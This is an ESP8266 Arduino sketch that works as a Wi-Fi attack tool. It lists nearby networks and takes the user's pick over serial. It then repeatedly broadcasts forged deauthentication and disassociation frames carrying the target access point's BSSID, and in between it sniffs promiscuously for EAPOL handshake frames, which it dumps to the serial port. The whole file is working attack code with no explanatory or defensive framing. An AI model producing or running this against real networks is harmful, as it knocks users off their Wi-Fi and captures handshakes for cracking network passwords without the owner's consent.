#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

uint8_t packet[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

void sniffer_callback(uint8_t *buf, uint16_t len) {
  for (int i = 0; i < len - 1; i++) {
    if (buf[i] == 0x88 && buf[i+1] == 0x8E) {
      Serial.print("PKT:");
      Serial.write((uint8_t*)&len, 2);
      Serial.write(buf, len);
      break;
    }
  }
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
}

void loop() {
  wifi_promiscuous_enable(0);
  int n = WiFi.scanNetworks();
  if (n <= 0) { delay(2000); return; }

  for (int i = 0; i < n; i++) {
    Serial.printf("%d: %s (CH %d)\n", i + 1, WiFi.SSID(i).c_str(), WiFi.channel(i));
  }

  Serial.println("choose wlan:");
  while (!Serial.available()) { delay(10); yield(); }
  int sel = Serial.parseInt() - 1;
  while (Serial.available()) Serial.read();

  if (sel >= 0 && sel < n) {
    uint8_t* bssid = WiFi.BSSID(sel);
    int ch = WiFi.channel(sel);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);

    Serial.printf("START_CAPTURE:%s\n", WiFi.SSID(sel).c_str());
    delay(500);

    wifi_set_channel(ch);
    uint16_t seq = 0;

    for (int i = 1; i <= 10; i++) {
      Serial.printf("Cycle %d/10 - Deauthing (5s)...\n", i);
      
      wifi_promiscuous_enable(0);
      unsigned long deauthEnd = millis() + 5000;
      while (millis() < deauthEnd) {
        seq++;
        packet[22] = (seq << 4) & 0xFF;
        packet[23] = (seq >> 4) & 0xFF;
        packet[0] = 0xC0; wifi_send_pkt_freedom(packet, 26, 0);
        packet[0] = 0xA0; wifi_send_pkt_freedom(packet, 26, 0);
        delay(10);
        yield();
      }

      Serial.println("Sniffing (10s)... Waiting for Handshake");
      wifi_promiscuous_enable(1);
      wifi_set_promiscuous_rx_cb(sniffer_callback);
      
      unsigned long sniffEnd = millis() + 10000;
      while (millis() < sniffEnd) {
        delay(10);
        yield();
      }
    }

    wifi_promiscuous_enable(0);
    Serial.println("END_CAPTURE");
  }
}
